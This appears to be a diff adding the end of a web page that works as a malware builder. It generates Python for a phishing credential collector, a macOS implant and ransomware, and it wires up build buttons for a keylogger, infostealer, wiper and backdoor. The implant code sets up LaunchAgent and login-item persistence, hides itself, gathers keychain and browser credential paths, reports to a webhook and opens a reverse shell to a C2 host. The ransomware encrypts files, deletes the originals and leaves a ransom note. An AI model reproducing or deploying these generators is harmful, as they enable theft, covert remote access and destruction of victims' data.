+    a('        print("[PHISH]", rec)');
+    a('        open("phish_log.jsonl", "a").write(json.dumps(rec) + "\\\\n")');
+    a("        if WEBHOOK:");
+    a("            try:");
+    a('                payload = json.dumps({"content": "phish hit: " + json.dumps(rec)[:1700]}).encode()');
+    a('                req = Request(WEBHOOK, data=payload, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})');
+    a("                urlopen(req, timeout=10)");
+    a("            except Exception: pass");
+    a("        self.send_response(302)");
+    a('        self.send_header("Location", REDIRECT)');
+    a("        self.end_headers()");
+    a("    def log_message(self, *a): pass");
+    a("");
+    a("def main():");
+    a("    ap = argparse.ArgumentParser()");
+    a('    ap.add_argument("--write-html", default="phish_' + brand + '.html")');
+    a('    ap.add_argument("--serve", action="store_true")');
+    a('    ap.add_argument("--port", type=int, default=8080)');
+    a("    args = ap.parse_args()");
+    a('    pathlib.Path(args.write_html).write_text(HTML, encoding="utf-8")');
+    a('    print("Wrote", args.write_html)');
+    a("    if args.serve:");
+    a('        print("Serving on", args.port)');
+    a('        HTTPServer(("0.0.0.0", args.port), H).serve_forever()');
+    a("");
+    a('if __name__ == "__main__":');
+    a("    main()");
+    return L.join("\n");
+  }
+
+  function buildMac() {
+    var label = val("mac-label") || "com.apple.services.update";
+    var hook = val("mac-hook");
+    var host = val("mac-host") || "127.0.0.1";
+    var port = parseInt(val("mac-port") || "4444", 10) || 4444;
+    var payload = val("mac-payload") || "print('mac payload')";
+    var launchagent = chk("mac-launchagent");
+    var login = chk("mac-login");
+    var keychain = chk("mac-keychain");
+    var browser = chk("mac-browser");
+    var reverse = chk("mac-reverse");
+    var hide = chk("mac-hide");
+    var bodyLines = payload.split(/\\r?\\n/);
+    var L = [];
+    function a(s) { L.push(s); }
+    a("#!/usr/bin/env python3");
+    a('"""Advanced macOS implant — LaunchAgent, login item, TCC paths, keychain/browser, reverse, hide"""');
+    a("import os, sys, json, platform, subprocess, plistlib, pathlib, time, socket, threading, shutil");
+    a("from urllib.request import Request, urlopen");
+    a("");
+    a('LABEL = "' + esc(label) + '"');
+    a('WEBHOOK = "' + esc(hook) + '"');
+    a('C2_HOST = "' + esc(host) + '"');
+    a("C2_PORT = " + port);
+    a("DO_LAUNCHAGENT = " + (launchagent ? "True" : "False"));
+    a("DO_LOGIN = " + (login ? "True" : "False"));
+    a("DO_KEYCHAIN = " + (keychain ? "True" : "False"));
+    a("DO_BROWSER = " + (browser ? "True" : "False"));
+    a("DO_REVERSE = " + (reverse ? "True" : "False"));
+    a("DO_HIDE = " + (hide ? "True" : "False"));
+    a("");
+    a("def _hook(msg):");
+    a("    if not WEBHOOK: return");
+    a("    try:");
+    a('        body = json.dumps({"content": msg[:1900]}).encode()');
+    a('        req = Request(WEBHOOK, data=body, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})');
+    a("        urlopen(req, timeout=10)");
+    a("    except Exception: pass");
+    a("");
+    a("def _home():");
+    a("    return pathlib.Path.home()");
+    a("");
+    a("def install_launchagent():");
+    a("    if not DO_LAUNCHAGENT: return");
+    a('    agents = _home() / "Library" / "LaunchAgents"');
+    a("    agents.mkdir(parents=True, exist_ok=True)");
+    a("    dest = agents / (LABEL + \".plist\")");
+    a("    script = pathlib.Path(__file__).resolve()");
+    a("    # copy self to ~/Library/Application Support for quieter path");
+    a('    support = _home() / "Library" / "Application Support" / ".svc"');
+    a("    support.mkdir(parents=True, exist_ok=True)");
+    a('    target = support / "update.py"');
+    a("    try:");
+    a("        if script != target: shutil.copy2(script, target)");
+    a("    except Exception: target = script");
+    a("    plist = {");
+    a('        "Label": LABEL,');
+    a('        "ProgramArguments": [sys.executable, str(target)],');
+    a('        "RunAtLoad": True,');
+    a('        "KeepAlive": True,');
+    a('        "StandardOutPath": "/tmp/" + LABEL + ".out",');
+    a('        "StandardErrorPath": "/tmp/" + LABEL + ".err",');
+    a("    }");
+    a('    with open(dest, "wb") as f: plistlib.dump(plist, f)');
+    a("    try: subprocess.run([\"launchctl\", \"load\", \"-w\", str(dest)], check=False, capture_output=True)");
+    a("    except Exception: pass");
+    a('    _hook("launchagent " + str(dest))');
+    a("");
+    a("def install_login_item():");
+    a("    if not DO_LOGIN: return");
+    a("    script = str(pathlib.Path(__file__).resolve())");
+    a("    osa = 'tell application \"System Events\" to make login item at end with properties {path:\"' + script + '\", hidden:true}'");
+    a("    try: subprocess.run([\"osascript\", \"-e\", osa], check=False, capture_output=True)");
+    a("    except Exception: pass");
+    a("");
+    a("def steal_keychain_hint():");
+    a("    if not DO_KEYCHAIN: return {}");
+    a('    kc = _home() / "Library" / "Keychains"');
+    a("    files = []");
+    a("    if kc.exists():");
+    a("        for p in kc.rglob('*'):");
+    a("            if p.is_file(): files.append({\"path\": str(p), \"size\": p.stat().st_size})");
+    a("    return {\"keychain_files\": files[:80]}");
+    a("");
+    a("def steal_browser():");
+    a("    if not DO_BROWSER: return {}");
+    a("    out = {}");
+    a("    home = _home()");
+    a('    chrome = home / "Library" / "Application Support" / "Google" / "Chrome" / "Default"');
+    a('    safari = home / "Library" / "Cookies" / "Cookies.binarycookies"');
+    a('    if (chrome / "Cookies").exists(): out["chrome_cookies"] = str(chrome / "Cookies")');
+    a('    if (chrome / "Login Data").exists(): out["chrome_logins"] = str(chrome / "Login Data")');
+    a("    if safari.exists(): out[\"safari_cookies\"] = str(safari)");
+    a("    return out");
+    a("");
+    a("def hide_self():");
+    a("    if not DO_HIDE: return");
+    a("    try:");
+    a("        p = pathlib.Path(__file__).resolve()");
+    a('        subprocess.run(["chflags", "hidden", str(p)], check=False, capture_output=True)');
+    a("    except Exception: pass");
+    a("");
+    a("def reverse_shell():");
+    a("    if not DO_REVERSE: return");
+    a("    def loop():");
+    a("        while True:");
+    a("            try:");
+    a("                s = socket.socket(); s.settimeout(10)");
+    a("                s.connect((C2_HOST, C2_PORT))");
+    a("                while True:");
+    a('                    s.sendall(b"$ ")');
+    a('                    cmd = s.recv(4096).decode(errors="ignore").strip()');
+    a('                    if not cmd or cmd.lower() in ("exit", "quit"): break');
+    a("                    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)");
+    a('                    s.sendall(p.communicate()[0] or b"")');
+    a("                s.close()");
+    a("            except Exception: time.sleep(15)");
+    a("    threading.Thread(target=loop, daemon=True).start()");
+    a("");
+    a("def _payload():");
+    bodyLines.forEach(function (line) { a("    " + line); });
+    a("");
+    a("def main():");
+    a('    if sys.platform != "darwin":');
+    a('        print("designed for macOS — continuing anyway")');
+    a("    info = {\"user\": os.environ.get(\"USER\"), \"host\": platform.node(), \"os\": platform.platform(), \"arch\": platform.machine()}");
+    a("    hide_self(); install_launchagent(); install_login_item()");
+    a("    data = {\"sys\": info, \"keychain\": steal_keychain_hint(), \"browser\": steal_browser()}");
+    a('    _hook("mac implant: " + json.dumps(data)[:1500])');
+    a("    reverse_shell(); _payload()");
+    a("    if DO_REVERSE:");
+    a("        while True: time.sleep(3600)");
+    a("");
+    a('if __name__ == "__main__":');
+    a("    main()");
+    return L.join("\n");
+  }
+
+
+  
+  
+  function buildRansom() {
+    var paths = (val("rw-paths") || "~/Documents").split(",").map(function (s) { return s.trim(); }).filter(Boolean);
+    var ext = (val("rw-ext") || ".txt,.pdf,.doc,.docx").split(",").map(function (s) { return s.trim().toLowerCase(); }).filter(Boolean);
+    var note = val("rw-note") || "README_RESTORE.txt";
+    var crypto = val("rw-crypto") || "xor";
+    var msg = val("rw-msg") || "Your files have been encrypted.\nKey ID: {key_id}";
+    var hook = val("rw-hook");
+    var confirm = chk("rw-confirm");
+    var keyfile = chk("rw-keyfile");
+    var L = [];
+    function a(s) { L.push(s); }
+    a("#!/usr/bin/env python3");
+    a('"""Advanced ransomware lab builder — encrypt/decrypt, notes, webhook. Only on systems you own."""');
+    a("import os, sys, json, base64, hashlib, secrets, pathlib, argparse");
+    a("from urllib.request import Request, urlopen");
+    a("");
+    a("TARGETS = " + JSON.stringify(paths));
+    a("EXTENSIONS = set(" + JSON.stringify(ext) + ")");
+    a('NOTE_NAME = "' + esc(note) + '"');
+    a('CRYPTO = "' + esc(crypto) + '"');
+    a("REQUIRE_CONFIRM = " + (confirm ? "True" : "False"));
+    a("SAVE_KEY = " + (keyfile ? "True" : "False"));
+    a('WEBHOOK = "' + esc(hook) + '"');
+    a("NOTE_TEMPLATE = " + JSON.stringify(msg));
+    a("");
+    a("def _hook(msg):");
+    a("    if not WEBHOOK: return");
+    a("    try:");
+    a('        body = json.dumps({"content": msg[:1900]}).encode()');
+    a('        req = Request(WEBHOOK, data=body, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})');
+    a("        urlopen(req, timeout=10)");
+    a("    except Exception: pass");
+    a("");
+    a("def _gen_key():");
+    a('    if CRYPTO == "fernet":');
+    a("        try:");
+    a("            from cryptography.fernet import Fernet");
+    a("            return Fernet.generate_key()");
+    a("        except ImportError:");
+    a('            print("[!] cryptography missing — XOR fallback")');
+    a("    return secrets.token_bytes(32)");
+    a("");
+    a("def _xor_crypt(data, key):");
+    a("    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))");
+    a("");
+    a("def _encrypt_bytes(data, key):");
+    a('    if CRYPTO == "fernet":');
+    a("        try:");
+    a("            from cryptography.fernet import Fernet");
+    a("            return Fernet(key).encrypt(data)");
+    a("        except Exception: pass");
+    a("    return _xor_crypt(data, key)");
+    a("");
+    a("def _decrypt_bytes(data, key):");
+    a('    if CRYPTO == "fernet":');
+    a("        try:");
+    a("            from cryptography.fernet import Fernet");
+    a("            return Fernet(key).decrypt(data)");
+    a("        except Exception: pass");
+    a("    return _xor_crypt(data, key)");
+    a("");
+    a("def _iter_files(root):");
+    a("    root = pathlib.Path(root).expanduser().resolve()");
+    a("    if not root.exists(): return");
+    a("    if root.is_file():");
+    a("        yield root; return");
+    a("    for dirpath, _, filenames in os.walk(root):");
+    a("        for name in filenames:");
+    a("            p = pathlib.Path(dirpath) / name");
+    a("            if p.name == NOTE_NAME: continue");
+    a('            if p.suffix.lower() == ".skid": continue');
+    a("            if EXTENSIONS and p.suffix.lower() not in EXTENSIONS: continue");
+    a("            yield p");
+    a("");
+    a("def encrypt_all(key):");
+    a("    count = 0");
+    a("    key_id = hashlib.sha256(key).hexdigest()[:16]");
+    a("    for base in TARGETS:");
+    a("        for p in _iter_files(base):");
+    a("            try:");
+    a('                data = open(p, "rb").read()');
+    a("                enc = _encrypt_bytes(data, key)");
+    a('                out = p.with_suffix(p.suffix + ".skid")');
+    a('                open(out, "wb").write(enc)');
+    a("                p.unlink()");
+    a("                count += 1");
+    a("            except Exception: pass");
+    a("        try:");
+    a("            root = pathlib.Path(base).expanduser().resolve()");
+    a("            if root.is_file(): root = root.parent");
+    a("            note = NOTE_TEMPLATE.replace('{key_id}', key_id)");
+    a('            open(root / NOTE_NAME, "w", encoding="utf-8").write(note)');
+    a("        except Exception: pass");
+    a("    return count, key_id");
+    a("");
+    a("def decrypt_all(key):");
+    a("    count = 0");
+    a("    for base in TARGETS:");
+    a("        root = pathlib.Path(base).expanduser().resolve()");
+    a("        if not root.exists(): continue");
+    a("        paths = [root] if root.is_file() else list(root.rglob('*.skid'))");
+    a("        for p in paths:");
+    a("            if not p.is_file(): continue");
+    a('            if p.suffix != ".skid": continue');
+    a("            try:");
+    a('                data = open(p, "rb").read()');
+    a("                dec = _decrypt_bytes(data, key)");
+    a("                orig = pathlib.Path(str(p)[:-5])");
+    a('                open(orig, "wb").write(dec)');
+    a("                p.unlink()");
+    a("                count += 1");
+    a("            except Exception: pass");
+    a("    return count");
+    a("");
+    a("def main():");
+    a("    ap = argparse.ArgumentParser()");
+    a('    ap.add_argument("--decrypt", action="store_true")');
+    a('    ap.add_argument("--key", default="", help="key file path")');
+    a("    args = ap.parse_args()");
+    a("    if args.decrypt:");
+    a("        kraw = args.key");
+    a("        if kraw and pathlib.Path(kraw).exists():");
+    a('            key = open(kraw, "rb").read().strip()');
+    a("        elif kraw:");
+    a("            try: key = base64.urlsafe_b64decode(kraw)");
+    a("            except Exception: key = kraw.encode()");
+    a("        else:");
+    a('            key = open("key.skid", "rb").read().strip()');
+    a("        n = decrypt_all(key)");
+    a('        print("decrypted", n); return');
+    a("    if REQUIRE_CONFIRM:");
+    a('        print("WARNING: encryption is destructive. Type ENCRYPT to continue.")');
+    a('        if input("> ").strip() != "ENCRYPT":');
+    a('            print("aborted"); return');
+    a("    key = _gen_key()");
+    a("    if SAVE_KEY:");
+    a('        open("key.skid", "wb").write(key)');
+    a('        print("key saved to key.skid — keep this to decrypt")');
+    a("    n, kid = encrypt_all(key)");
+    a('    _hook("ransom encrypted=" + str(n) + " key_id=" + kid)');
+    a('    print("encrypted", n, "key_id", kid)');
+    a("");
+    a('if __name__ == "__main__":');
+    a("    main()");
+    return L.join("\n");
+  }
+
+  document.querySelectorAll("nav button").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      document.querySelectorAll("nav button").forEach(function (b) { b.classList.remove("active"); });
+      btn.classList.add("active");
+      document.querySelectorAll("main .panel").forEach(function (p) { p.classList.add("hidden"); });
+      var tab = $("tab-" + btn.getAttribute("data-tab"));
+      if (tab) tab.classList.remove("hidden");
+    });
+  });
+  document.querySelectorAll("[data-copy]").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      var text = $(btn.getAttribute("data-copy")).textContent;
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(function () {
+          btn.textContent = "Copied";
+          setTimeout(function () { btn.textContent = "Copy"; }, 1000);
+        });
+      }
+    });
+  });
+  document.querySelectorAll("[data-dl]").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      downloadGroup(btn.getAttribute("data-dl").split("-")[0], btn.getAttribute("data-name") || "payload");
+    });
+  });
+  function bind(id, fn, group, base, status, meta, out) {
+    var el = $(id);
+    if (!el) return;
+    el.addEventListener("click", function () {
+      try { ship(group, base, fn(), status, meta, out); }
+      catch (e) { setStatus(status, String(e), true); console.error(e); }
+    });
+  }
+  bind("kl-build", buildKeylogger, "kl", "keylogger", "kl-status", "kl-meta", "kl-out");
+  bind("st-build", buildStealer, "st", "infostealer", "st-status", "st-meta", "st-out");
+  bind("wp-build", buildWiper, "wp", "wiper", "wp-status", "wp-meta", "wp-out");
+  bind("bd-build", buildBackdoor, "bd", "backdoor", "bd-status", "bd-meta", "bd-out");
+  bind("mw-build", buildMalware, "mw", "malware", "mw-status", "mw-meta", "mw-out");
+  bind("ph-build", buildPhish, "ph", "phishing", "ph-status", "ph-meta", "ph-out");
+  bind("mac-build", buildMac, "mac", "mac_malware", "mac-status", "mac-meta", "mac-out");
+  bind("rw-build", buildRansom, "rw", "ransomware", "rw-status", "rw-meta", "rw-out");
+})();
+
+</script>
+</div>
+</body>
+</html>
